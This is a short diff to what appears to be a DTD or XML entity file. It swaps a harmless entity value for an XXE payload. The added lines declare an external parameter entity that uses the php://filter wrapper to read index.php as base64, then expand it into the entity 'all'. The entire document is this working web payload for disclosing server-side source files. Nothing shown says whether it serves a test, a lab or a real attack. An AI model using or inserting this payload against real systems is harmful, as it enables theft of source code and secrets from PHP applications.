@@ -1,1 +1,2 @@
-<!ENTITY all "test">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY all "%file;">
